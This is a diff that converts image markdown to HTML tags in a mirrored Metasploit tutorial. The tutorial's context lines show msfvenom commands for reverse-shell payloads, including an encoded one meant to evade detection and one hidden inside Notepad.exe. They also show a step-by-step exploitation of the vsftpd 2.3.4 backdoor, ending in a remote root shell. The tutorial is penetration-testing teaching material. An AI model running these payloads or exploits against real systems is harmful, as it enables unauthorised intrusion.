@@ -7,7 +7,7 @@ image: "https://cdn-images-1.medium.com/max/800/0*mfNYbBlGNjBfV5cH"
 # The Ultimate Guide to Metasploit. Part 1.
 
 
-![Cover image](https://cdn-images-1.medium.com/max/800/0*mfNYbBlGNjBfV5cH)
+<img src="https://cdn-images-1.medium.com/max/800/0*mfNYbBlGNjBfV5cH" alt="Cover image" width="705" height="423" loading="eager" fetchpriority="high" decoding="async" />
 
 :::info Article Metadata
 - **Category:** CTI
@@ -23,7 +23,7 @@ This page mirrors the original Medium article into the 1200km.com Docusaurus eco
 
 ### A Complete Guide to Exploiting Vulnerabilities and Strengthening Security with Metasploit
 
-![Article image](https://cdn-images-1.medium.com/max/800/0*mfNYbBlGNjBfV5cH)
+<img src="https://cdn-images-1.medium.com/max/800/0*mfNYbBlGNjBfV5cH" alt="Article image" width="705" height="423" loading="lazy" decoding="async" />
 
 ### What is Metasploit?
 
@@ -75,7 +75,7 @@ Metasploit has become a cornerstone in cybersecurity for several reasons:
 
 - **2009**: Acquired by Rapid7, which enhanced its development and added a commercial version, Metasploit Pro.
 
-![Article image](https://cdn-images-1.medium.com/max/800/0*eK2_434DOSwBXz2U.png)
+<img src="https://cdn-images-1.medium.com/max/800/0*eK2_434DOSwBXz2U.png" alt="Article image" width="1024" height="328" loading="lazy" decoding="async" />
 
 **Today**: It has grown into a framework with over 2,000 exploits and payloads, supporting various platforms and devices.
 
@@ -134,7 +134,7 @@ framework
 msfconsole
 ```
 
-![Article image](https://cdn-images-1.medium.com/max/800/1*VF8YJyfkRJF3pYvWSDZIHw.png)
+<img src="https://cdn-images-1.medium.com/max/800/1*VF8YJyfkRJF3pYvWSDZIHw.png" alt="Article image" width="793" height="779" loading="lazy" decoding="async" />
 
 **2. Installing Metasploit on Other Platforms**
 
@@ -206,7 +206,7 @@ msfconsole
 --version
 ```
 
-![Article image](https://cdn-images-1.medium.com/max/800/1*gnPsKnfIA1yzNfoJTnVzdQ.png)
+<img src="https://cdn-images-1.medium.com/max/800/1*gnPsKnfIA1yzNfoJTnVzdQ.png" alt="Article image" width="367" height="52" loading="lazy" decoding="async" />
 
 ## Components of Metasploit Framework
 
@@ -240,7 +240,7 @@ The**msfconsole**is the command-line interface (CLI) for the Metasploit Framewor
 msfconsole
 ```
 
-![Article image](https://cdn-images-1.medium.com/max/800/1*pz2Sm6COXkICE7xRyzv4Gw.png)
+<img src="https://cdn-images-1.medium.com/max/800/1*pz2Sm6COXkICE7xRyzv4Gw.png" alt="Article image" width="782" height="738" loading="lazy" decoding="async" />
 
 ### 2. msfdb
 
@@ -278,7 +278,7 @@ start
 db_status
 ```
 
-![Article image](https://cdn-images-1.medium.com/max/800/1*lTXhJUk52io27BjrsE_0PA.png)
+<img src="https://cdn-images-1.medium.com/max/800/1*lTXhJUk52io27BjrsE_0PA.png" alt="Article image" width="667" height="81" loading="lazy" decoding="async" />
 
 ### Viewing Hosts
 
@@ -288,7 +288,7 @@ To see the hosts scanned or added to the database:
 hosts
 ```
 
-![Article image](https://cdn-images-1.medium.com/max/800/1*EBHGRaq_W4d8Luwc7bIJaQ.png)
+<img src="https://cdn-images-1.medium.com/max/800/1*EBHGRaq_W4d8Luwc7bIJaQ.png" alt="Article image" width="1763" height="340" loading="lazy" decoding="async" />
 
 ### Viewing Services
 
@@ -298,7 +298,7 @@ To see details of services running on hosts:
 services
 ```
 
-![Article image](https://cdn-images-1.medium.com/max/800/1*A9KUIUwbfCXXqW9uflSFxg.png)
+<img src="https://cdn-images-1.medium.com/max/800/1*A9KUIUwbfCXXqW9uflSFxg.png" alt="Article image" width="1763" height="340" loading="lazy" decoding="async" />
 
 ### Viewing Vulnerabilities
 
@@ -308,7 +308,7 @@ To view vulnerabilities discovered during scans:
 vulns
 ```
 
-![Article image](https://cdn-images-1.medium.com/max/800/1*spDqC0EteIlA4SrniVWNxA.png)
+<img src="https://cdn-images-1.medium.com/max/800/1*spDqC0EteIlA4SrniVWNxA.png" alt="Article image" width="1908" height="360" loading="lazy" decoding="async" />
 
 ### Viewing Loot
 
@@ -393,7 +393,7 @@ To see all available payloads in Metasploit:
 msfvenom -l payloads
 ```
 
-![Article image](https://cdn-images-1.medium.com/max/800/1*YzIGUZuL8Dfd8y3cvhEpKA.png)
+<img src="https://cdn-images-1.medium.com/max/800/1*YzIGUZuL8Dfd8y3cvhEpKA.png" alt="Article image" width="1463" height="241" loading="lazy" decoding="async" />
 
 ### List Available Encoders
 
@@ -403,7 +403,7 @@ To view all available encoders:
 msfvenom -l encoders
 ```
 
-![Article image](https://cdn-images-1.medium.com/max/800/1*zuYKMTLpcKmFsBd0rCvyLA.png)
+<img src="https://cdn-images-1.medium.com/max/800/1*zuYKMTLpcKmFsBd0rCvyLA.png" alt="Article image" width="1128" height="543" loading="lazy" decoding="async" />
 
 ### List Output Formats
 
@@ -417,7 +417,7 @@ msfvenom
  formats
 ```
 
-![Article image](https://cdn-images-1.medium.com/max/800/1*q59Juob3pPWtiHlccWUzew.png)
+<img src="https://cdn-images-1.medium.com/max/800/1*q59Juob3pPWtiHlccWUzew.png" alt="Article image" width="1095" height="328" loading="lazy" decoding="async" />
 
 ### List of all supported platforms
 
@@ -427,7 +427,7 @@ msfvenom
  platforms
 ```
 
-![Article image](https://cdn-images-1.medium.com/max/800/1*9pdow1w4CGGJ57Fzyy9h-A.png)
+<img src="https://cdn-images-1.medium.com/max/800/1*9pdow1w4CGGJ57Fzyy9h-A.png" alt="Article image" width="846" height="339" loading="lazy" decoding="async" />
 
 ### Here are three example msfvenom commands using different flags, along with their explanations:
 
@@ -441,7 +441,7 @@ msfvenom
 msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.100 LPORT=4444 -f exe -o reverse_payload.exe
 ```
 
-![Article image](https://cdn-images-1.medium.com/max/800/1*0UeLWnIjVDUtSXZNPkG89A.png)
+<img src="https://cdn-images-1.medium.com/max/800/1*0UeLWnIjVDUtSXZNPkG89A.png" alt="Article image" width="1250" height="160" loading="lazy" decoding="async" />
 
 **Explanation:**
 
@@ -467,7 +467,7 @@ This command generates a payload that, when executed on the target machine, will
 msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.0.1 LPORT=5555 -e x86/shikata_ga_nai -i 5 -f elf -o encoded_payload.elf
 ```
 
-![Article image](https://cdn-images-1.medium.com/max/800/1*Ywkm1C7ImBmUkzctZprZLg.png)
+<img src="https://cdn-images-1.medium.com/max/800/1*Ywkm1C7ImBmUkzctZprZLg.png" alt="Article image" width="1495" height="317" loading="lazy" decoding="async" />
 
 **Explanation:**
 
@@ -497,7 +497,7 @@ This command creates an encoded reverse shell payload designed to evade detectio
 msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.2.200 LPORT=8080 -x ~/Notepad.exe -k -f exe -o stealth_payload.exe
 ```
 
-![Article image](https://cdn-images-1.medium.com/max/800/1*nQsBNLKZuoHmn4Lz-dPK3Q.png)
+<img src="https://cdn-images-1.medium.com/max/800/1*nQsBNLKZuoHmn4Lz-dPK3Q.png" alt="Article image" width="1477" height="160" loading="lazy" decoding="async" />
 
 **Explanation:**
 
@@ -556,7 +556,7 @@ nmap -sV
 .130
 ```
 
-![Article image](https://cdn-images-1.medium.com/max/800/1*Yg_ozPCwM5nI_1dV-k6YJA.png)
+<img src="https://cdn-images-1.medium.com/max/800/1*Yg_ozPCwM5nI_1dV-k6YJA.png" alt="Article image" width="1743" height="820" loading="lazy" decoding="async" />
 
 Look for services with known vulnerabilities, such as:
 
@@ -574,7 +574,7 @@ Look for services with known vulnerabilities, such as:
 msfconsole
 ```
 
-![Article image](https://cdn-images-1.medium.com/max/800/1*TTnvdlJbpw0QMNQ6lcSYmw.png)
+<img src="https://cdn-images-1.medium.com/max/800/1*TTnvdlJbpw0QMNQ6lcSYmw.png" alt="Article image" width="1457" height="214" loading="lazy" decoding="async" />
 
 ### 3. Search for mode for vulnerability:
 
@@ -587,7 +587,7 @@ search
 .4
 ```
 
-![Article image](https://cdn-images-1.medium.com/max/800/1*AMNIB7XZJyfOkL59ahflRQ.png)
+<img src="https://cdn-images-1.medium.com/max/800/1*AMNIB7XZJyfOkL59ahflRQ.png" alt="Article image" width="1423" height="265" loading="lazy" decoding="async" />
 
 ### 3. Choose an Exploit
 
@@ -599,7 +599,7 @@ Use an exploit that targets a known vulnerability. For example:
 use exploit/unix/ftp/vsftpd_234_backdoor
 ```
 
-![Article image](https://cdn-images-1.medium.com/max/800/1*sRcNDm4asZM1zXKMH8S4ug.png)
+<img src="https://cdn-images-1.medium.com/max/800/1*sRcNDm4asZM1zXKMH8S4ug.png" alt="Article image" width="1325" height="76" loading="lazy" decoding="async" />
 
 ### 4. Show exploit configuration:
 
@@ -608,7 +608,7 @@ show
  options 
 ```
 
-![Article image](https://cdn-images-1.medium.com/max/800/1*258kKmPeu7dBnnPVotSOfg.png)
+<img src="https://cdn-images-1.medium.com/max/800/1*258kKmPeu7dBnnPVotSOfg.png" alt="Article image" width="1472" height="498" loading="lazy" decoding="async" />
 
 ### 4. Set Required Options
 
@@ -621,7 +621,7 @@ set
  RPORT 21
 ```
 
-![Article image](https://cdn-images-1.medium.com/max/800/1*Xmg1djYxYnYfEE7HYV-a1g.png)
+<img src="https://cdn-images-1.medium.com/max/800/1*Xmg1djYxYnYfEE7HYV-a1g.png" alt="Article image" width="715" height="97" loading="lazy" decoding="async" />
 
 ### 5. Run the exploit
 
@@ -629,7 +629,7 @@ set
 run
 ```
 
-![Article image](https://cdn-images-1.medium.com/max/800/1*Wtt3fn00kweQuxz7g65y2w.png)
+<img src="https://cdn-images-1.medium.com/max/800/1*Wtt3fn00kweQuxz7g65y2w.png" alt="Article image" width="1125" height="194" loading="lazy" decoding="async" />
 
 ### 6. Interact with the Meterpreter Session
 
@@ -648,7 +648,7 @@ i
 help
 ```
 
-![Article image](https://cdn-images-1.medium.com/max/800/1*hHDLW5_NQXBYFNCBK6yWLg.png)
+<img src="https://cdn-images-1.medium.com/max/800/1*hHDLW5_NQXBYFNCBK6yWLg.png" alt="Article image" width="1135" height="470" loading="lazy" decoding="async" />
 
 ### 8.Open remote shell
 
@@ -656,7 +656,7 @@ help
 shell
 ```
 
-![Article image](https://cdn-images-1.medium.com/max/800/1*isEs1-Khd9D9PDfcYAYH9A.png)
+<img src="https://cdn-images-1.medium.com/max/800/1*isEs1-Khd9D9PDfcYAYH9A.png" alt="Article image" width="851" height="205" loading="lazy" decoding="async" />
 
 ### You are root!
 
